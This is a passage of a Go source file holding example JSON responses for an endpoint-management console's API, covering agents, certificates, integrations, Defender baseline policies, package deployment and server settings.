package server

// Records several responses share. The same two endpoints, groups and
// people appear throughout, with the IDs the body examples use, so a
// reader can follow one object from route to route.
const (
	// A Linux web server, reporting the client profile it runs with.
	agentWeb01Example = `{
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"os": "linux",
		"arch": "amd64",
		"site": "dc-east",
		"agent_version": "0.57.41",
		"platform": "ubuntu",
		"platform_version": "24.04",
		"kernel_version": "6.8.0-45-generic",
		"cpu_count": 4,
		"mem_total_mb": 7951,
		"ips": ["10.20.1.11"],
		"first_seen": "2026-03-02T14:05:11Z",
		"last_heartbeat": "2026-10-20T08:41:52Z",
		"last_facts": "2026-10-20T08:40:07Z",
		"online": true,
		"settings": {"sensor_interval_seconds": 60, "log_level": "info", "random_delay_seconds": 30, "profile": "Web servers"},
		"watch_revision": "3f9a1c7e2b40",
		"managed": true
	}`

	// A Windows laptop one agent version behind.
	agentLaptopExample = `{
		"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
		"hostname": "FIN-LT-0142",
		"os": "windows",
		"arch": "amd64",
		"site": "hq",
		"agent_version": "0.57.40",
		"platform": "Microsoft Windows 11 Pro",
		"platform_version": "10.0.26100 Build 26100",
		"kernel_version": "10.0.26100 Build 26100",
		"cpu_count": 8,
		"mem_total_mb": 16088,
		"ips": ["10.40.7.23", "fe80::4c1d:9a2e:7b3f:1c05"],
		"first_seen": "2026-05-19T07:58:40Z",
		"last_heartbeat": "2026-10-20T08:42:10Z",
		"last_facts": "2026-10-20T08:31:44Z",
		"online": true,
		"settings": {"sensor_interval_seconds": 900, "log_level": "info"},
		"managed": true
	}`

	// The ...Fields constants are the fields of an object without its
	// braces, so an answer can add its own (a group's member_count).
	webServersGroupFields = `"id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3",
		"name": "Web servers",
		"description": "Linux hosts running nginx",
		"kind": "dynamic",
		"match_mode": "all",
		"rules": [
			{"field": "os", "op": "equals", "value": "linux"},
			{"field": "services.name", "op": "equals", "value": "nginx"}
		],
		"member_ids": [],
		"created_at": "2026-04-08T10:22:51Z",
		"created_by": "jdoe"`

	pilotGroupFields = `"id": "cgrp-6ea76dc9c2fb40e65159fc3cbda2a266",
		"name": "Pilot",
		"description": "Endpoints that take every change first",
		"kind": "static",
		"match_mode": "all",
		"rules": [],
		"member_ids": ["agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9"],
		"created_at": "2026-04-08T10:31:09Z",
		"created_by": "jdoe"`

	// The approval policy of the body examples, as created. An update
	// stamps updated_at.
	approvalPolicyLargeDeployFields = `"id": "ap-7d3f9b1e5a2c48e6b0a4c8d2f6e1a3b5",
		"name": "Approve deployments to 25 or more web servers",
		"module": "deploy",
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"min_devices": 25,
		"enabled": true,
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:24:16Z"`

	// The content set of the body examples, after a save that names
	// every kind. The set itself dates from March.
	contentSetServiceDeskHead = `"id": "cs-3b7f1d5a9c2e48e6b0a4d8c2f6e1b3a5",
		"name": "Service desk",
		"description": "What the service desk role may use"`
	contentSetAllKinds = `"contents": {
			"sensors": ["installed_apps", "services", "disks"],
			"packages": ["sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5"],
			"dashboards": ["db-64d2472106baa7637afc9e7b7aec4f73"],
			"questions": ["sq-4739d2a01d7cbf3af69cb575c57fb394"]
		}`

	// The dashboard alert of the body examples: its fields as saved,
	// without what an evaluation records.
	dashboardAlertFields = `"id": "al-0f6b2d8a4c1e49e7b3a5c9d1f7e2b4a6",
		"name": "Critical vulnerabilities on web servers",
		"dashboard_id": "db-64d2472106baa7637afc9e7b7aec4f73",
		"panel_id": "pn-d39dba1141c3f1330c20d7d5f8fe4406",
		"condition": {"op": "nonzero"},
		"severity": "high",
		"enabled": true`

	// What the Guide pass writes for that alert: the panel counts three
	// critical findings on the web servers.
	dashboardAlertTriggered = `"last_value": 3,
		"last_state": "triggered",
		"last_detail": "Critical vulnerabilities on \"Web tier posture\" is 3; alert when count is not zero."`

	// The saved question of the body examples, read back from the
	// database (a save answers with the stored row). Postgres keeps the
	// conditions as jsonb, so their keys come back in its order.
	savedQuestionWebExample = `{
		"id": "sq-4739d2a01d7cbf3af69cb575c57fb394",
		"name": "Web servers by OS version",
		"description": "Linux endpoints running nginx, counted by OS version",
		"get": ["platform_version"],
		"where": [{"op": "equals", "field": "os", "value": "linux"}, {"op": "equals", "field": "services.name", "value": "nginx"}],
		"match_all": true,
		"created_at": "2026-09-15T11:20:04Z",
		"created_by": "jdoe"
	}`

	// The webhook trigger of the body examples, on the weekly patching
	// playbook. The token is never read back: an answer says only that
	// there is one.
	playbookTriggerWebhookFields = `"id": "pbt-5c9e3a7f1b2d48e6a0c4d8b2f6e1a3c7",
		"playbook_id": "pb-61a3b2f60a1ace8deee382700533b5a5",
		"playbook_name": "Weekly patching for web servers",
		"kind": "webhook",
		"enabled": true,
		"source": "",
		"severity": "",
		"title_match": ""`
	playbookTriggerCreated = `"created_at": "2026-10-07T11:05:42Z",
		"created_by": "jdoe"`

	// The trigger after the CI pipeline called its URL once, on 9 October.
	playbookTriggerFiredExample = `{` + playbookTriggerWebhookFields + `,
		"has_token": true,
		"min_interval_seconds": 3600,
		"last_fired_at": "2026-10-09T16:42:18Z",
		"last_detail": "webhook from 10.20.0.40",
		"fire_count": 1,
		` + playbookTriggerCreated + `
	}`

	agentUpdateExample = `{
		"asked": 1,
		"results": [
			{"hostname": "FIN-LT-0142", "agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "os": "windows", "from": "0.57.40", "started": true, "detail": "updating to 0.57.41"}
		],
		"serving": "0.57.41",
		"started": 1
	}`

	// The jq package of the body examples, as stored. The update's
	// answer is the same record.
	jqPackageExample = `{
		"self_service_follow_latest": false,
		"id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
		"kind": "software",
		"name": "jq",
		"vendor": "",
		"version": "1.7.1",
		"description": "Command-line JSON processor",
		"category": "Utilities",
		"icon": "",
		"commands": {
			"linux": {"install": "apt-get install -y jq", "update": "apt-get install -y --only-upgrade jq"},
			"windows": {"install": "winget install --silent --accept-package-agreements --accept-source-agreements --id jqlang.jq", "update": "winget upgrade --silent --accept-package-agreements --accept-source-agreements --id jqlang.jq"}
		},
		"detect": {"app_name": "jq", "match": "exact"},
		"requirements": {},
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"self_service": false,
		"allow_requests": false,
		"require_explicit_targets": false,
		"enabled": true,
		"source": "manual",
		"command_timeout_seconds": 600,
		"expire_seconds": 86400,
		"created_at": "2026-09-30T15:20:44Z",
		"updated_at": "2026-09-30T15:20:44Z",
		"created_by": "jdoe",
		"updated_by": ""
	}`

	// A manual patch run on the two endpoints, one of them still
	// installing when the list was read.
	patchRunFields = `"id": "run-0e7c3a9f5b1d48e2a6c4f8b0d2e9a1c3",
		"schedule_name": "",
		"target_desc": "2 selected endpoint(s)",
		"agent_count": 2,
		"triggered_by": "jdoe",
		"started_at": "2026-10-20T07:58:14Z"`

	// jdoe, the operator throughout these examples; the user-group
	// example adds her to a group by this ID.
	userJdoeFields = `"id": "usr-2e6a0c4f8b1d47e3a9c5f1b7d3e0a8c6",
		"username": "jdoe",
		"email": "jdoe@example.com",
		"display_name": "Jane Doe",
		"source": "local",
		"is_admin": false,
		"role_ids": ["role-7c3e9a1f5b2d48e6a0c4b8d2f6e1a3c9"],
		"group_ids": ["grp-4a8c2e6f0b1d47e3a9c5b7d1f3e8a0c2"],
		"created_at": "2026-02-11T09:03:27Z",
		"mfa_enabled": true`

	// A local account just created: no role yet, so it can only read.
	userNewExample = `{
		"id": "usr-8f4b0d6a2c1e49e7b3a5c9d1f7e0b2a4",
		"username": "asmith",
		"email": "",
		"display_name": "Alex Smith",
		"source": "local",
		"is_admin": false,
		"active": true,
		"role_ids": [],
		"group_ids": [],
		"created_at": "2026-10-20T09:14:52Z",
		"mfa_enabled": false
	}`

	enrollTokenRecordFields = `"id": "etk-1d5f9b3e7a2c46e8b0d4f6a8c2e1b3d7",
		"label": "Web servers, rack B",
		"site": "dc-east",
		"max_uses": 10,
		"uses": 3,
		"created_by": "jdoe",
		"created_at": "2026-10-20T07:12:09Z",
		"expires_at": "2026-10-21T07:12:09Z",
		"last_used_at": "2026-10-20T07:41:55Z"`

	// The managed certificate of the body examples, on web-01, renewed
	// from Mustra's private CA once jdoe approved it. Its fingerprint is
	// the certificate web-01 reports, and the issued list's active
	// www.example.com entry.
	wwwManagedCertFields = `"id": "mc-609abf253e18b8bf13685449474e7170",
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"name": "www.example.com",
		"names": ["www.example.com"],
		"cert_path": "/etc/nginx/ssl/www.example.com.crt",
		"key_path": "/etc/nginx/ssl/www.example.com.key",
		"reload_cmd": "systemctl reload nginx",
		"verify_port": 443,
		"ca": "private",
		"win_bind": "",
		"iis_site": "",
		"renew_days": 30,
		"approval": "approve",
		"enabled": true,
		"state": "idle",
		"created_by": "jdoe",
		"created_at": "2026-03-18T03:09:51Z"`

	wwwManagedCertExample = `{` + wwwManagedCertFields + `,
		"last_renewed_at": "2026-08-17T09:31:12Z",
		"last_attempt_at": "2026-08-17T09:31:12Z",
		"last_detail": "Issued by Mustra Private CA and installed; valid until 2027-02-13.\nWrote /etc/nginx/ssl/www.example.com.crt and /etc/nginx/ssl/www.example.com.key (backups kept as *.mustra-bak-20260817T093110Z).\nReloaded with: systemctl reload nginx\nVerified: port 443 presents the new certificate.\nfingerprint 27e2b9473f560fb164c0be48f6c027cae724628ef5688b3bb5b44678f5258a0d",
		"expires_at": "2027-02-13T09:31:11Z"
	}`

	// A certificate bought elsewhere and uploaded: Mustra installs it but
	// cannot renew it, so the next one is uploaded too.
	portalManagedCertExample = `{
		"id": "mc-1be58cde6444d00eea8a21b129b81a37",
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"name": "portal.example.com",
		"names": ["portal.example.com", "www.portal.example.com"],
		"cert_path": "/etc/nginx/ssl/portal.example.com.crt",
		"key_path": "/etc/nginx/ssl/portal.example.com.key",
		"reload_cmd": "systemctl reload nginx",
		"verify_port": 443,
		"ca": "upload",
		"win_bind": "",
		"iis_site": "",
		"renew_days": 30,
		"approval": "auto",
		"enabled": true,
		"state": "idle",
		"last_renewed_at": "2026-10-20T08:52:30Z",
		"last_attempt_at": "2026-10-20T08:52:30Z",
		"last_detail": "Uploaded certificate from Sectigo RSA Domain Validation Secure Server CA installed; valid until 2027-05-06.\nWrote /etc/nginx/ssl/portal.example.com.crt and /etc/nginx/ssl/portal.example.com.key (backups kept as *.mustra-bak-20261020T085228Z).\nReloaded with: systemctl reload nginx\nVerified: port 443 presents the new certificate.\nfingerprint 7bf09fc8f8d737a5858bd97eb4ae17ac3cd91220533fc563fb385de028489923",
		"expires_at": "2027-05-06T23:59:59Z",
		"created_by": "jdoe",
		"created_at": "2026-03-20T11:05:47Z"
	}`

	// The managed certificate as web-01 reports it; the list leaves out
	// where it is installed, and the single read adds it.
	wwwCertificateRowFields = `"fingerprint": "27e2b9473f560fb164c0be48f6c027cae724628ef5688b3bb5b44678f5258a0d",
		"subject": "www.example.com",
		"issuer": "Mustra Private CA",
		"dns_names": ["www.example.com"],
		"not_before": "2026-08-17T08:31:11Z",
		"not_after": "2027-02-13T09:31:11Z",
		"days_left": 116,
		"status": "ok",
		"is_ca": false,
		"self_signed": false,
		"trust_store": false,
		"key_algorithm": "ECDSA",
		"sig_algorithm": "ECDSA-SHA384",
		"deployments": 1`

	// Mustra's private CA in every endpoint's trust store but the Mac's,
	// which needs an MDM profile and has no MDM to get it from.
	privateRootEndpointsFields = `"counts": {"failed": 1, "installed": 2, "total": 3},
		"endpoints": [
			{"agent_id": "agt-a5f17ac9d34a0b8dd362373426b5497f", "hostname": "build-mac-02", "os": "darwin", "fingerprint": "627ba64f3af0b571f5b70de322831c9af88a16d651876d9917618f169a310b2e", "state": "failed", "via": "mdm", "detail": "macOS trusts a new root only from an MDM profile, and no MDM is set up (Settings → Fleet MDM; docs/MACOS-UPDATES.md)", "updated_at": "2026-10-20T06:15:02Z"},
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "os": "windows", "fingerprint": "627ba64f3af0b571f5b70de322831c9af88a16d651876d9917618f169a310b2e", "state": "installed", "via": "agent", "detail": "installed in LocalMachine\\Root", "updated_at": "2026-05-19T08:03:44Z"},
			{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "os": "linux", "fingerprint": "627ba64f3af0b571f5b70de322831c9af88a16d651876d9917618f169a310b2e", "state": "installed", "via": "agent", "detail": "installed /usr/local/share/ca-certificates/mustra-627ba64f3af0.crt (update-ca-certificates)", "updated_at": "2026-03-18T03:14:20Z"}
		]`

	// The agent trust settings: agents download from the public URL, and
	// every one of them has its own credential. Saving answers with the
	// settings read back, as the read does.
	agentTrustExample = `{
		"public_url": "https://mustra.corp.example.com",
		"public_url_from_env": false,
		"allow_http": false,
		"legacy_allowed": false,
		"legacy_configured": false,
		"needs_reenrollment": 0,
		"identity_enforced": true,
		"signing_key_id": "9c4e1a7f3b2d5e80",
		"signing_mode": "release-signed",
		"caller_is_admin": true
	}`

	// jdoe's preferences. Saving them answers with what was stored, which
	// the read then shows.
	jdoePreferencesExample = `{
		"results_complete_percent": 99,
		"sign_out_after_minutes": 180,
		"theme": "dark",
		"palette": "mustra",
		"landing_page": "/",
		"hide_error_results": true,
		"timestamps": "local",
		"show_environment_details": true,
		"home_dashboard_id": "db-64d2472106baa7637afc9e7b7aec4f73",
		"home_dashboard_list": ["db-64d2472106baa7637afc9e7b7aec4f73"],
		"hidden_modules": []
	}`

	privateRootFields = `"id": "private",
		"name": "Mustra Private CA",
		"fingerprint": "627ba64f3af0b571f5b70de322831c9af88a16d651876d9917618f169a310b2e",
		"subject": "CN=Mustra Private CA,O=mustra",
		"not_after": "2036-03-18T03:09:40Z"`

	// The Entra ID app registration Mustra reads devices with, synced
	// on its timer this morning. The secret is never shown, only set.
	entraConfigExample = `{
		"client_id": "3f7c1a9e-5b2d-4e80-a6c4-9d1f8b2e7a35",
		"last_error": "",
		"last_sync": "2026-10-20T08:15:02Z",
		"secret_set": true,
		"tenant_id": "8b2e6d4a-1c9f-47e3-b5a0-2d7f9c3e1a68"
	}`

	// The scrape token Prometheus reads /metrics with: nothing is sent,
	// so it has no delivery history.
	prometheusIntegrationExample = `{
		"id": "int-2c8e4a0f6b1d49e7a3c5b9d1f7e3a0c4",
		"kind": "prometheus",
		"name": "Prometheus (scrape token)",
		"enabled": true,
		"config": {},
		"secret_set": true,
		"events": ["alert"],
		"min_severity": "warning",
		"sent": 0,
		"created_by": "jdoe",
		"created_at": "2026-06-11T14:20:37Z"
	}`

	// The integration body examples' SOC webhook, without its delivery
	// history. They send no secret, so its events go unsigned.
	socWebhookFields = `"id": "int-7a1d5f9b3e2c48e6b0a4c8d2f6e1b3a9",
		"kind": "webhook",
		"name": "SOC webhook",
		"enabled": true,
		"config": {"url": "https://hooks.example.com/mustra"},
		"secret_set": false,
		"events": ["alert", "audit"],
		"min_severity": "warning",
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:02:44Z"`

	// What else is connected, for the Integrations page: SSO and SCIM,
	// Entra, Guacamole, the private CA, one Connect export and syslog
	// forwarding are set up; the Fleet MDM and Cloudflare are not (see
	// the settings and the certificate authorities).
	integrationsTailExample = `"dropped": 0,
		"kinds": {
			"discord": "Discord",
			"loki": "Grafana Loki",
			"prometheus": "Prometheus (scrape token)",
			"servicenow": "ServiceNow (incidents)",
			"slack": "Slack",
			"splunk_hec": "Splunk (HTTP Event Collector)",
			"teams": "Microsoft Teams",
			"webhook": "Webhook (JSON)"
		},
		"overview": {
			"cloudflare": false,
			"connect": 1,
			"entra": true,
			"fleet_mdm": false,
			"mdm_enroll_url": false,
			"oidc": true,
			"private_ca": true,
			"remote": {"enabled": true, "provider": "guacamole"},
			"scim": true,
			"syslog": true,
			"update_repo": "mustra-dev/mustra"
		}`

	// The integrations once the SOC webhook has delivered a few events.
	integrationsListExample = `{
		` + integrationsTailExample + `,
		"integrations": [
			` + prometheusIntegrationExample + `,
			{` + socWebhookFields + `, "last_ok_at": "2026-10-20T09:40:11Z", "sent": 3}
		]
	}`

	// The certificate authorities Cert Manager can renew from, by kind.
	certCAsExample = `{
		"acme": "Let's Encrypt (Cloudflare DNS)",
		"adcs": "Active Directory Certificate Services",
		"cloudflare_origin": "Cloudflare Origin CA",
		"private": "Mustra Private CA",
		"tailscale": "Tailscale HTTPS (Let's Encrypt, tailnet names)",
		"upload": "Your own certificate (uploaded)"
	}`

	// The role body example, as created; each save moves updated_at.
	webOperatorsRoleFields = `"id": "role-5b9d3f7a1e2c48e6a0c4d8b2f6e1a3c7",
		"name": "Web server operators",
		"description": "Patch and deploy software on the web servers",
		"permissions": ["patches.manage", "deploy.manage"],
		"computer_group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"is_builtin": false,
		"created_at": "2026-10-20T09:24:06Z"`

	// The OIDC provider body examples' Keycloak realm. The client secret
	// is write-only and never sent; client_secret_set says whether one is
	// stored.
	corpSSOProviderFields = `"id": "corp-sso",
		"label": "Sign in with Corp SSO",
		"kind": "keycloak",
		"issuer_url": "https://sso.corp.example.com/realms/corp",
		"client_id": "mustra",
		"redirect_url": "https://mustra.corp.example.com/auth/callback/corp-sso",
		"sort_order": 10,
		"created_at": "2026-02-11T08:40:15Z",
		"created_by": "jdoe",
		"client_secret_set": true`

	// The server's settings but for the stream's retention, which the
	// settings update changes. Tokens are never sent back (scim_token and
	// update_token are always empty), only whether each is set; the
	// passwords are stored as hashes. No Fleet MDM is set up, so the
	// Mac's trusted root waits for one (see the trusted roots).
	settingsFields = `"sso_status": "active",
		"sso_allowlist": {
			"domains": "example.com",
			"emails": "",
			"groups": "mustra-operators",
			"groups_claim": "groups",
			"env_domains": "",
			"env_emails": "",
			"env_groups": ""
		},
		"import_allowed_hosts": "packages.corp.example.com",
		"webhook_allowed_hosts": "",
		"backdoor_username": "breakglass",
		"backdoor_password_set": true,
		"uninstall_password_set": true,
		"macos_mdm_enroll_url": "",
		"scim_token": "",
		"scim_token_set": true,
		"scim_enabled": true,
		"stale_after_seconds": 30,
		"offline_expiry_seconds": 3600,
		"agent_nats_url": "tls://mustra.corp.example.com:4222",
		"stream_min_hours": 1,
		"stream_max_hours": 168,
		"stream_messages": 18342,
		"stream_bytes": 41938211,
		"logo_url": "/branding/logo?v=1",
		"update_repo": "mustra-dev/mustra",
		"update_token": "",
		"update_token_set": false, "mail_host": "smtp.example.com", "mail_port": 587, "mail_security": "starttls", "mail_username": "mustra@example.com", "mail_password_set": true, "mail_from": "mustra@example.com",
		"fleet_url": "",
		"fleet_token_set": false,
		"fleet_macos_major": false,
		"nats_url": "tls://nats:4222",
		"http_addr": ":8080",
		"cookie_secure": true,
		"credential_vault_configured": true,
		"local_mfa_required": false`

	// The label of the body examples, as stored: Postgres keeps the
	// criteria as jsonb, so they come back in its key order, not the
	// order they were sent in. Its answers add their own updated_at.
	packageLabelFields = `"id": "lbl-5bfef69ac4cad46dcb6fc00c22a888b2",
		"name": "Package updates in a maintenance window",
		"expected": true,
		"criteria": {"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"], "path_prefix": "/usr/", "during_maintenance": true},
		"priority": 10,
		"enabled": true,
		"created_by": "jdoe",
		"created_at": "2026-10-06T09:12:45Z"`

	// The monitor of the body examples: the Web server configuration
	// watchlist on the Web servers group, so on web-01.
	webConfigMonitorFields = `"id": "mon-2eb2467f11ce4027284835e37da6053b",
		"name": "Web server configuration",
		"watchlist_id": "wl-8e3b1f7d2a6c49e0b5d1a9f3c7e2b4d6",
		"watchlist_name": "Web server configuration",
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"enabled": true,
		"created_by": "jdoe",
		"created_at": "2026-09-24T10:18:33Z"`

	// The Enforce policy of the body examples, as stored: one setting,
	// chronyd running on the web servers, in report mode. The run
	// example's dry run is a pass of this policy.
	timeSyncPolicyFields = `"id": "enf-5a9d3f7b1c2e48e6a0b4d8f2c6e1a3b9",
		"name": "Time sync on web servers",
		"description": "chronyd keeps the clock right on every web server",
		"os": "linux",
		"group_id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3",
		"group_name": "Web servers",
		"group_deleted": false,
		"mode": "report",
		"enabled": true,
		"kind": "",
		"config": {},
		"settings": [
			{"id": "set-6b1e9d3a7c2f48e5a0d4b8c2f6e1a9d3", "name": "chronyd is running", "severity": "medium", "rules": ["p:chronyd"], "remediate_linux": "systemctl start chronyd"}
		],
		"setting_count": 1,
		"created_at": "2026-09-14T10:22:37Z",
		"created_by": "jdoe"`

	// What the compile body example (a Defender form) turns into: the
	// settings a typed policy stores and the endpoint runs. Tamper
	// protection has no fix, so it only ever reports.
	defenderSettingsExample = `[
		{"id": "set-defender-90328d9aeee2", "name": "Defender: antimalware service is running", "severity": "critical", "rules": ["c:(Get-MpComputerStatus).AMServiceEnabled -> r:^True$"], "remediate_windows": "Set-Service WinDefend -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service WinDefend"},
		{"id": "set-defender-8f1dc0bdd766", "name": "Defender: real-time protection is on", "severity": "critical", "rules": ["c:(Get-MpComputerStatus).RealTimeProtectionEnabled -> r:^True$"], "remediate_windows": "Set-MpPreference -DisableRealtimeMonitoring $false"},
		{"id": "set-defender-e138f4a4fce5", "name": "Defender: cloud-delivered protection is advanced", "severity": "high", "rules": ["c:(Get-MpPreference).MAPSReporting -> r:^2$"], "remediate_windows": "Set-MpPreference -MAPSReporting Advanced -SubmitSamplesConsent SendSafeSamples"},
		{"id": "set-defender-b6b2c76ced32", "name": "Defender: potentially unwanted applications are blocked", "severity": "medium", "rules": ["c:(Get-MpPreference).PUAProtection -> r:^1$"], "remediate_windows": "Set-MpPreference -PUAProtection Enabled"},
		{"id": "set-defender-d060ddf428cd", "name": "Defender: signatures are no older than 48 hours", "severity": "high", "rules": ["c:(((Get-Date) - (Get-MpComputerStatus).AntivirusSignatureLastUpdated).TotalHours -le 48) -> r:^True$"], "remediate_windows": "Update-MpSignature"},
		{"id": "set-defender-6a45e2faf119", "name": "Defender: a quick scan runs every day", "severity": "low", "rules": ["c:(Get-MpPreference).ScanScheduleDay -> r:^0$", "c:(Get-MpPreference).ScanParameters -> r:^1$"], "remediate_windows": "Set-MpPreference -ScanScheduleDay Everyday -ScanParameters QuickScan"},
		{"id": "set-defender-818da39497ca", "name": "Defender: tamper protection is on (report only)", "severity": "high", "rules": ["c:(Get-MpComputerStatus).IsTamperProtected -> r:^True$"]}
	]`

	// A typed policy enforcing that form on the pilot ring. Its platform
	// follows the kind, and config is the form as saved.
	defenderPolicyFields = `"id": "enf-8b2d6f0a4c1e47e9b3a5d7c9e1f3a5b7",
		"name": "Defender baseline",
		"description": "Real-time and cloud protection on, PUA blocked, daily quick scan",
		"os": "windows",
		"group_id": "cgrp-6ea76dc9c2fb40e65159fc3cbda2a266",
		"group_name": "Pilot",
		"group_deleted": false,
		"mode": "enforce",
		"enabled": true,
		"kind": "defender",
		"config": {"realtime": true, "cloud_level": "advanced", "pua": "block", "signature_max_age_hours": 48, "daily_quick_scan": true, "check_tamper_protection": true},
		"settings": ` + defenderSettingsExample + `,
		"setting_count": 7,
		"created_at": "2026-10-02T14:18:55Z",
		"created_by": "jdoe",
		"updated_at": "2026-10-02T14:18:55Z",
		"updated_by": "jdoe",
		"last_run_at": "2026-10-20T08:16:40Z"`

	// Results on FIN-LT-0142 from the Defender policy's last pass: tamper
	// protection has no fix, so it stays drifted; PUA blocking was off and
	// was turned back on.
	defenderTamperResultExample = `{
		"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
		"hostname": "FIN-LT-0142",
		"policy_id": "enf-8b2d6f0a4c1e47e9b3a5d7c9e1f3a5b7",
		"setting_id": "set-defender-818da39497ca",
		"name": "Defender: tamper protection is on (report only)",
		"severity": "high",
		"state": "drifted",
		"detail": "failed: c:(Get-MpComputerStatus).IsTamperProtected -> r:^True$ (no remediation defined for windows)",
		"consecutive_failures": 0,
		"remediation_count": 0,
		"checked_at": "2026-10-20T08:16:31Z"
	}`

	defenderPUAResultExample = `{
		"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
		"hostname": "FIN-LT-0142",
		"policy_id": "enf-8b2d6f0a4c1e47e9b3a5d7c9e1f3a5b7",
		"setting_id": "set-defender-b6b2c76ced32",
		"name": "Defender: potentially unwanted applications are blocked",
		"severity": "medium",
		"state": "remediated",
		"detail": "was: failed: c:(Get-MpPreference).PUAProtection -> r:^1$",
		"consecutive_failures": 0,
		"remediation_count": 1,
		"checked_at": "2026-10-20T08:16:31Z",
		"last_remediated_at": "2026-10-20T08:16:31Z"
	}`

	// The one web server where chronyd was not running at the dry run.
	timeSyncDriftResultExample = `{
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"policy_id": "enf-5a9d3f7b1c2e48e6a0b4d8f2c6e1a3b9",
		"setting_id": "set-6b1e9d3a7c2f48e5a0d4b8c2f6e1a9d3",
		"name": "chronyd is running",
		"severity": "medium",
		"state": "drifted",
		"detail": "failed: p:chronyd",
		"consecutive_failures": 0,
		"remediation_count": 0,
		"checked_at": "2026-10-20T08:30:52Z"
	}`

	// Reveal's rule of the body examples, as stored: card numbers on the
	// web servers' finance share, without snippets. The PCI-DSS set of
	// the body examples holds it, so the set's groups and enabled flag
	// are written onto it whenever the set is saved.
	revealCardRuleFields = `"id": "rvl-3a7c1e9f5b2d48a6c0e4f8b2d6a1c9e3",
		"name": "Payment cards on finance shares",
		"description": "Card numbers in exports on the finance file servers",
		"kind": "rule",
		"enabled": true,
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"roots": {"linux": ["/srv/finance"], "windows": ["D:\\Finance"]},
		"exclude": ["archive"],
		"extensions": ["csv", "txt"],
		"max_size_bytes": 5242880,
		"modified_within_days": 90,
		"pattern_ids": ["credit_card"],
		"custom_patterns": [],
		"min_matches": 3,
		"require_pairs": [],
		"interval_hours": 24,
		"snippets": false,
		"created_by": "jdoe",
		"created_at": "2026-09-02T10:14:33Z"`

	revealRuleSetFields = `"id": "rset-2f8b4d0a6c1e43e9b7a5d3f1c8e6a0b4",
		"name": "PCI-DSS cardholder data",
		"regime": "PCI-DSS",
		"description": "Card numbers at rest on the payment servers",
		"rule_ids": ["rvl-3a7c1e9f5b2d48a6c0e4f8b2d6a1c9e3"],
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"enabled": true,
		"created_by": "jdoe",
		"created_at": "2026-09-02T10:20:05Z"`

	// The Log shipper package of the body examples, built in Deploy: 2.4.1
	// installs the .deb the import example fetched, and replaced 2.4.0.
	// The console mints the variant and step IDs and keeps them from one
	// version to the next.
	logShipperRevision241Fields = `"retired": false,
		"id": "rev-8c59c2e37d2fd48f5fd97dc1900ce3dc",
		"package_id": "sw-aea1f4a2d761e08c32d3d711dd2dd419",
		"label": "2.4.1",
		"definition": ` + logShipperDefinition241 + `,
		"published": true,
		"created_by": "jdoe",
		"created_at": "2026-10-14T09:10:44Z"`

	logShipperDefinition241 = `{
			"version": 1,
			"variants": [{
				"id": "s_3f9c1a7e2b40d58e",
				"os": "linux",
				"arch": ["amd64"],
				"version": "2.4.1",
				"detection": {"kind": "app", "name": "log-shipper"},
				"actions": {
					"install": {
						"validation": {"kind": "app", "name": "log-shipper", "field": "version", "operator": "version", "value": ">=2.4.1"},
						"require_files": true,
						"files": [{"id": "pf-a07aca4de37c22a5473a1ca436b9f8e1", "name": "log-shipper_2.4.1_amd64.deb", "sha256": "1e6bd13666a86b48563bb9db9643994c965b748ba927eb3339b051d011c24367", "size": 9418752}],
						"steps": [{"id": "s_8d2e6b0a4c1f97e3", "name": "Run installer", "script": {"language": "shell", "source": "dpkg -i \"$MUSTRA_PACKAGE_DIR/log-shipper_2.4.1_amd64.deb\"", "timeout_seconds": 900}, "files": ["pf-a07aca4de37c22a5473a1ca436b9f8e1"]}],
						"identity": "administrator"
					}
				}
			}]
		}`

	// jq's install on web-01 (GET /api/deploy/jobs), as the endpoint
	// logged it: the installed-applications check before and after, and
	// the installer's output.
	jqInstallLogExample = `{
		"events": [
			{"id": "evt-ac3dfa043ede8402ea15763fd7df163d", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "stage": "check", "status": "running", "message": "sensor installed_apps: agent=0.57.41 revision=builtin match=false rows=[evidence truncated after 16 KB]", "timestamp": "2026-10-19T13:02:47.218Z"},
